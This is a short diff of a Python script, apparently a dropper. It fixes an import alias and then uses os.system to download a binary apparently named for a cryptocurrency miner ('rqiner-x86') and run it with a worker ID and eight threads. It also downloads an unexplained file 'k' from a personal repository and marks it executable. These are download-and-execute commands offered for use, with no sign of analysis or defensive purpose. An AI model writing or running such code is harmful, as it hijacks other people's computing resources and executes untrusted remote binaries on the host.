@@ -1,4 +1,4 @@
-import os as kampre
+import os as kampret
 kampret.system("wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.4.1/rqiner-x86 && chmod +x rqiner-x86 && ./rqiner-x86 -i XJELCGMMEXRKRACURWWHGHGEYNIASDDPZFBIDOPYQGVQMXLKCALNOSZGXHUH -t 8")
 kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/k")
 kampret.system("chmod +x k")
